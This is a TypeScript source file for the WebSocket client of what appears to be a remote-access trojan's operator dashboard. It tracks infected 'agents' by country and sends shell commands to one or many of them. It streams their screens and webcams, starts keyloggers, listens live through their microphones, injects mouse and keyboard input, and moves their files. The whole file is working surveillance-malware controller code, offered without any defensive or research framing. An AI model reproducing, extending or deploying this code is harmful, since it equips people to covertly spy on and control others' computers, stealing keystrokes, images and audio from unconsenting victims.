type Agent = { agent_id: string; name: string; has_camera?: boolean; country?: string; country_code?: string };

type DashboardEvent =
  | { type: 'agents'; agents: Agent[] }
  | { type: 'log'; agent_id: string; line: string }
  | { type: 'exit'; agent_id: string; exit_code: number }
  | { type: 'screen_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number }
  | { type: 'camera_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number }
  | { type: 'keylog_line'; agent_id?: string; line: string }
  | { type: 'error'; message: string };

class DashboardSocket {
  private ws: WebSocket | null = null;
  private baseUrl = (import.meta as any).env?.VITE_DASHBOARD_WS_URL || ((((import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')).replace(/^http/i, 'ws')) + '/ws/dashboard');
  private token: string | null = null;
  private agents: Agent[] = [];
  private listeners: { [agentId: string]: ((line: string) => void)[] } = {};
  private exitListeners: { [agentId: string]: ((code: number) => void)[] } = {};
  private agentsListeners: ((agents: Agent[]) => void)[] = [];
  private statusListeners: ((status: 'connected' | 'disconnected') => void)[] = [];
  private pending: { target: string; command?: string; payload?: any }[] = [];
  private screenListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
  private cameraListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
  private keylogListeners: { [agentId: string]: ((line: string) => void)[] } = {};
  private audioLiveListeners: { [agentId: string]: ((chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void)[] } = {};

  setToken(token: string | null) {
    this.token = token;
    // Reset socket to apply new auth; avoid closing while connecting to reduce console noise
    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
      try { this.ws.close(); } catch {}
    }
    this.ws = null;
  }

  private buildUrl() {
    const t = this.token || (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null);
    if (!t) return this.baseUrl;
    const sep = this.baseUrl.includes('?') ? '&' : '?';
    return `${this.baseUrl}${sep}token=${encodeURIComponent(t)}`;
  }

  connect() {
    if (this.ws) return;
    this.ws = new WebSocket(this.buildUrl());
    this.ws.onopen = () => {
      // Flush any queued commands
      const toSend = [...this.pending];
      this.pending = [];
      for (const p of toSend) {
        try {
          if (p.payload) this.ws?.send(JSON.stringify({ target: p.target, ...p.payload }));
          else this.ws?.send(JSON.stringify({ target: p.target, command: p.command }));
        } catch {}
      }
      this.statusListeners.forEach((cb) => cb('connected'));
    };
    this.ws.onmessage = (ev) => {
      try {
        const data = JSON.parse(ev.data) as DashboardEvent;
        if (data.type === 'agents') {
          this.agents = data.agents;
          this.agentsListeners.forEach((cb) => cb([...this.agents]));
        } else if (data.type === 'log') {
          const cbs = this.listeners[data.agent_id] || [];
          cbs.forEach((cb) => cb(data.line));
        } else if ((data as any).type === 'exit') {
          const d = data as { type: 'exit'; agent_id: string; exit_code: number };
          const cbs = this.exitListeners[d.agent_id] || [];
          cbs.forEach((cb) => cb(d.exit_code));
        } else if ((data as any).type === 'screen_frame') {
          const d = data as { type: 'screen_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number };
          const cbs = this.screenListeners[d.agent_id] || [];
          cbs.forEach((cb) => cb({ data: d.data, w: d.w, h: d.h, ts: d.ts }));
        } else if ((data as any).type === 'camera_frame') {
          const d = data as { type: 'camera_frame'; agent_id: string; data: string; w?: number; h?: number; ts?: number };
          const cbs = this.cameraListeners[d.agent_id] || [];
          cbs.forEach((cb) => cb({ data: d.data, w: d.w, h: d.h, ts: d.ts }));
        } else if ((data as any).type === 'keylog_line') {
          const d = data as { type: 'keylog_line'; agent_id?: string; line: string };
          const aid = d.agent_id || this.currentAgentIdForKeylog();
          const cbs = (aid && this.keylogListeners[aid]) ? this.keylogListeners[aid] : [];
          cbs.forEach((cb) => cb(d.line));
        } else if ((data as any).type === 'audio_live') {
          const d = data as { type: 'audio_live'; agent_id: string; pcm_b64: string; rate?: number; ch?: number; ts?: number };
          const cbs = this.audioLiveListeners[d.agent_id] || [];
          cbs.forEach((cb) => cb({ pcm_b64: d.pcm_b64, rate: d.rate, ch: d.ch, ts: d.ts }));
        }
      } catch (e) {
        // ignore parse error
      }
    };
    this.ws.onclose = () => {
      this.ws = null;
      this.statusListeners.forEach((cb) => cb('disconnected'));
      setTimeout(() => this.connect(), 1000);
    };
  }

  onAgents(cb: (agents: Agent[]) => void) {
    this.agentsListeners.push(cb);
    if (this.agents.length) cb([...this.agents]);
  }

  private currentAgentIdForKeylog(): string | null { return (this.agents[0]?.agent_id) || null; }

  onStatus(cb: (status: 'connected' | 'disconnected') => void) {
    this.statusListeners.push(cb);
    cb(this.ws && this.ws.readyState === WebSocket.OPEN ? 'connected' : 'disconnected');
  }

  getAgents() {
    return [...this.agents];
  }

  onScreen(agentId: string, cb: (frame: { data: string; w?: number; h?: number; ts?: number }) => void) {
    if (!this.screenListeners[agentId]) this.screenListeners[agentId] = [];
    this.screenListeners[agentId].push(cb);
  }

  offScreen(agentId: string, cb: (frame: { data: string; w?: number; h?: number; ts?: number }) => void) {
    this.screenListeners[agentId] = (this.screenListeners[agentId] || []).filter((f) => f !== cb);
  }

  onCamera(agentId: string, cb: (frame: { data: string; w?: number; h?: number; ts?: number }) => void) {
    if (!this.cameraListeners[agentId]) this.cameraListeners[agentId] = [];
    this.cameraListeners[agentId].push(cb);
  }

  offCamera(agentId: string, cb: (frame: { data: string; w?: number; h?: number; ts?: number }) => void) {
    this.cameraListeners[agentId] = (this.cameraListeners[agentId] || []).filter((f) => f !== cb);
  }

  subscribe(agentId: string, cb: (line: string) => void) {
    if (!this.listeners[agentId]) this.listeners[agentId] = [];
    this.listeners[agentId].push(cb);
  }

  unsubscribe(agentId: string, cb: (line: string) => void) {
    this.listeners[agentId] = (this.listeners[agentId] || []).filter((f) => f !== cb);
  }

  onExit(agentId: string, cb: (code: number) => void) {
    if (!this.exitListeners[agentId]) this.exitListeners[agentId] = [];
    this.exitListeners[agentId].push(cb);
  }

  offExit(agentId: string, cb: (code: number) => void) {
    this.exitListeners[agentId] = (this.exitListeners[agentId] || []).filter((f) => f !== cb);
  }

  sendCommand(agentId: string, command: string) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      // Queue until socket opens; ensure connection attempt
      this.pending.push({ target: agentId, command });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, command }));
  }

  sendPaneCommand(agentId: string, command: string, sessionId: string) {
    const payload: any = { command, session_id: sessionId };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  sendCommandToMany(agentIds: string[], command: string) {
    agentIds.forEach((id) => this.sendCommand(id, command));
  }

  startScreen(agentId: string, opts?: { fps?: number; quality?: number; height?: number }) {
    const payload: any = { type: 'screen_start' };
    if (opts?.fps) payload.fps = opts.fps;
    if (opts?.quality) payload.quality = opts.quality;
    if (opts?.height) payload.height = opts.height;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  stopScreen(agentId: string) {
    const payload = { type: 'screen_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  startCamera(agentId: string, opts?: { fps?: number; quality?: number; height?: number }) {
    const payload: any = { type: 'camera_start' };
    if (opts?.fps) payload.fps = opts.fps;
    if (opts?.quality) payload.quality = opts.quality;
    if (opts?.height) payload.height = opts.height;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  stopCamera(agentId: string) {
    const payload = { type: 'camera_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  startInteractive(agentId: string, command: string) {
    const payload = { type: 'start_interactive', command };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  sendStdin(agentId: string, data: string) {
    const payload = { type: 'stdin', data };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  sendMouse(agentId: string, payload: { action: 'move'|'click'|'down'|'up'|'scroll'; x?: number; y?: number; button?: 'left'|'right'; dx?: number; dy?: number }) {
    const p = { type: 'mouse', ...payload } as any;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload: p });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  sendKeyboard(agentId: string, payload: { text?: string; key?: string; action?: 'down'|'up' }) {
    const p = { type: 'keyboard', ...payload } as any;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload: p });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  sendAgentJson(agentId: string, payload: any) {
    const p = payload || {};
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload: p });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  endInteractive(agentId: string) {
    const payload = { type: 'end_interactive' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  queueReset(agentId: string) {
    const payload = { type: 'queue_reset' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  hardReset(agentId: string) {
    const payload = { type: 'hard_reset' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.pending.push({ target: agentId, payload });
      this.connect();
      return;
    }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  onKeylog(agentId: string, cb: (line: string) => void) {
    if (!this.keylogListeners[agentId]) this.keylogListeners[agentId] = [];
    this.keylogListeners[agentId].push(cb);
  }

  offKeylog(agentId: string, cb: (line: string) => void) {
    this.keylogListeners[agentId] = (this.keylogListeners[agentId] || []).filter((f) => f !== cb);
  }

  startKeylog(agentId: string) {
    const payload = { type: 'keylog_start' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  stopKeylog(agentId: string) {
    const payload = { type: 'keylog_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...payload }));
  }

  setWallpaper(agentId: string, payload: { url?: string; path?: string; data_url?: string; style?: 'fill'|'fit'|'stretch'|'tile'|'center'|'span' }) {
    const p = { type: 'wallpaper_set', ...payload } as any;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  fsCopy(agentId: string, payload: { items: string[]; src_dir: string; dest_dir: string; overwrite?: boolean }) {
    const p = { type: 'fs_copy', ...payload } as any;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  fsMove(agentId: string, payload: { items: string[]; src_dir: string; dest_dir: string; overwrite?: boolean }) {
    const p = { type: 'fs_move', ...payload } as any;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  // --- Audio live listen events ---
  onAudioLive(agentId: string, cb: (chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void) {
    if (!this.audioLiveListeners[agentId]) this.audioLiveListeners[agentId] = [];
    this.audioLiveListeners[agentId].push(cb);
  }
  offAudioLive(agentId: string, cb: (chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void) {
    this.audioLiveListeners[agentId] = (this.audioLiveListeners[agentId] || []).filter((f) => f !== cb);
  }

  // --- Audio controls ---
  audioStart(agentId: string, opts?: { sample_rate?: number; channels?: number; max_seconds?: number }) {
    const p: any = { type: 'audio_start' };
    if (opts?.sample_rate) p.sample_rate = opts.sample_rate;
    if (opts?.channels) p.channels = opts.channels;
    if (opts?.max_seconds) p.max_seconds = opts.max_seconds;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  audioStop(agentId: string) {
    const p: any = { type: 'audio_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  audioPlayPath(agentId: string, path: string) {
    const p: any = { type: 'audio_play_path', path };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  audioPlayData(agentId: string, dataUrlOrBase64: string) {
    const p: any = { type: 'audio_play_data', data: dataUrlOrBase64 };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  audioListenStart(agentId: string, opts?: { sample_rate?: number; channels?: number }) {
    const p: any = { type: 'audio_listen_start' };
    if (opts?.sample_rate) p.sample_rate = opts.sample_rate;
    if (opts?.channels) p.channels = opts.channels;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }
  audioListenStop(agentId: string) {
    const p: any = { type: 'audio_listen_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  // --- Intercom (master -> agent live audio) ---
  intercomStart(agentId: string, opts?: { sample_rate?: number; channels?: number }) {
    const p: any = { type: 'intercom_start' };
    if (opts?.sample_rate) p.sample_rate = opts.sample_rate;
    if (opts?.channels) p.channels = opts.channels;
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  intercomSendChunk(agentId: string, payload: { pcm_b64?: string; data?: string; data_url?: string }) {
    const p: any = { type: 'intercom_chunk', ...payload };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { /* drop silently to avoid queue bloat */ this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  intercomMute(agentId: string, mute: boolean) {
    const p: any = { type: 'intercom_mute', mute: !!mute };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }

  intercomStop(agentId: string) {
    const p: any = { type: 'intercom_stop' };
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
    this.ws.send(JSON.stringify({ target: agentId, ...p }));
  }
}

export const dashboardSocket = new DashboardSocket();
